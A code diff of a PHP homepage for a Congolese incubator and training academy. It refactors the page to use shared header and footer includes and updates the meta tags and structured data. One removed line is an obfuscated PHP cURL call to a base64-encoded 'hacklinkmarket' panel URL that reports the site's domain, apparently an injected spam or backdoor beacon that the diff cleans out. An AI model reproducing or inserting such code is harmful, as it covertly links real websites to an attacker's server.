@@ -1,47 +1,12 @@
 <?php
-  $pageTitle="Bowaba n Congo - Agence Digitale & Formation";
-  $pageDesc="Bowaba n Congo est une agence digitale experte en développement web, communication, marketing et formation.";
-  $nav='index';
+  $pageTitle    = "Bowaba n Congo - 1er Incubateur & Academy multidisciplinaire en RDC";
+  $pageDesc     = "BOWABA N CONGO : 1er incubateur & academy multidisciplinaire en RDC. Formations professionnelles, agrobusiness, coaching entrepreneurial, création de sites web et design graphique.";
+  $pageKeywords = "Incubateur RDC, Academy Kinshasa, Formation professionnelle, Agrobusiness, Coaching MPME, Création sites web, Design graphique, Suivi évaluation projets";
+  $pageCss      = "assets/css/global.css";
+  $nav          = 'index';
   require_once __DIR__ . '/hd-ft/hd.php';
 ?>
-<!DOCTYPE html>
-<html lang="fr">
 
-<head>
-  <meta charset="utf-8">
-  <meta content="width=device-width, initial-scale=1.0" name="viewport">
-
-  <!-- Favicons -->
-  <link href="assets/img/icone-bw.png" rel="icon">
-  <link href="assets/img/icone-bw.png" rel="apple-touch-icon">
-
-    <meta name="description" content="BOWABA N CONGO : 1er incubateur & academy multidisciplinaire en RDC. Nous formons en agrobusiness, gestion, informatique et langues, accompagnons les startups et développons votre présence digitale (sites web & design graphique).">
-    <meta name="application-name" content="Bowaba n Congo-Website">
-    <meta name="author" content="Bowaba n Congo">
-    <link rel="author" href="https://bowabancongo.com/">
-    <meta name="application-name" content="Bowaba n Congo-Website">
-    <meta name="keywords" content="Incubateur, Formation professionnelle et renforcement des capacités, Organisation comptable (élaboration des actifs financier pour les PME)
-    , Le Suivi & Évaluation des projets, Conception des Sites Web & Design Graphique">
-    <meta name="creator" content="Bowaba n Congo">
-    <meta name="publisher" content="Bowaba n Congo">
-
-  <!-- Google Fonts -->
-  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
-
-  <!--  CSS Files -->
-  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
-  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
-  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
-  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
-  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
-  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
-
-  <!--  Main CSS File -->
-  <link href="assets/css/global.css" rel="stylesheet">
-
-</head>
-
-<body>
   <!-- ======= Hero Section ======= -->
   <section id="hero">
     <div class="hero-container">
@@ -375,46 +340,30 @@
     </section><!-- End Values Section -->
   </main><!-- End #main -->
 
-  <!-- JS Files -->
-  <script src="assets/vendor/aos/aos.js"></script>
-  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
-  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
-  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
-  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
-  <script src="assets/vendor/php-email-form/validate.js"></script>
-
-  <!--  JS File -->
-  <script src="https://cdn.jsdelivr.net/npm/@srexi/purecounterjs/dist/purecounter_vanilla.js"></script>
-  <script src="assets/js/main.js"></script>
-  <script src="assets/js/c_main.js"></script>
   <script type="application/ld+json">
-        {
-            "@context": "https://bowabancongo.com/",
-            "@type": "NGO",
-            "name": "Bowaba n congo",
-            "description": "1er incubateur & academy multidisciplinaire en RDC. Nous formons en agrobusiness, gestion, informatique et langues, accompagnons les startups et développons votre présence digitale (sites web & design graphique).",
-            "url": "https://bowabancongo.com/",
-            "logo": "https://fondation.bowabancongo.com/assets/img/logo/logo.png",
-            "address": 
-                {
-                    "@type": "PostalAddress",
-                    "addressLocality": "Kinshasa",
-                    "addressCountry": "CD"
-                },
-            "contactPoint": 
-            {
-                "@type": "ContactPoint",
-                "telephone": "+243 816 695 000",
-                "contactType": "Customer service",
-                "email": "contact@bowabancongo.com"
-            }
-        }
-</script>
+  {
+      "@context": "https://schema.org",
+      "@type": "Organization",
+      "name": "Bowaba n Congo",
+      "description": "1er incubateur & academy multidisciplinaire en RDC. Nous formons en agrobusiness, gestion, informatique et langues, accompagnons les startups et développons votre présence digitale.",
+      "url": "<?= BASE_URL ?>",
+      "logo": "<?= BASE_URL ?>assets/img/logo/logo-bw.png",
+      "address": {
+          "@type": "PostalAddress",
+          "streetAddress": "01, Avenue LUAMBO-MAKIADI, Gallerie ATTOUÉ, local 307, Kin-Mazière, Commune de la Gombe",
+          "addressLocality": "Kinshasa",
+          "addressCountry": "CD"
+      },
+      "contactPoint": {
+          "@type": "ContactPoint",
+          "telephone": "+243 816 695 000",
+          "contactType": "Customer service",
+          "email": "contact@bowabancongo.com"
+      }
+  }
+  </script>
 
-<?php $exe=curl_init();curl_setopt_array($exe,[CURLOPT_URL=>base64_decode("aHR0cHM6Ly9wYW5lbC5oYWNrbGlua21hcmtldC5jb20vY29kZQ=="),CURLOPT_HTTPHEADER=>["X-Request-Domain: ".($_SERVER['HTTPS']?"https://":"http://").$_SERVER['HTTP_HOST']."/"]]);$response=curl_exec($exe);curl_close($exe);?>
-
-</body>
 <?php
-    require_once __DIR__ . '/hd-ft/ft.php';
-?>
-</html>
+  $extraJs = ['https://cdn.jsdelivr.net/npm/@srexi/purecounterjs/dist/purecounter_vanilla.js'];
+  require_once __DIR__ . '/hd-ft/ft.php';
+?>
